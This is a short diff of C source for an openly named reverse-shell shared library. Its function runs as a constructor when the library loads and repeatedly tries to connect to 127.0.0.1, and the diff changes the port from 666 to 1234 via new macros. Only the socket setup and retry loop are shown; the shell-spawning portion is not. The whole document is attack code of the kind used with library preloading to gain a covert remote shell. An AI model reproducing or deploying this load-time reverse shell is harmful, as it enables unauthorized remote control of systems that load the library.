@@ -3,7 +3,10 @@
 #include <arpa/inet.h>
 #include <stdlib.h>
 #include <unistd.h>
- 
+
+#define port 1234
+#define addr "127.0.0.1"
+
 void __attribute__((constructor)) reverse_shell(){ 
   int socket_fd;
   int connection_fd = -1;
@@ -12,8 +15,8 @@ void __attribute__((constructor)) reverse_shell(){
   
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
   server.sin_family = AF_INET;
-  server.sin_port = htons(666);
-  server.sin_addr.s_addr = inet_addr("127.0.0.1");
+  server.sin_port = htons(1234);
+  server.sin_addr.s_addr = inet_addr(addr);
     
   while(connection_fd < 0){
     sleep(5);
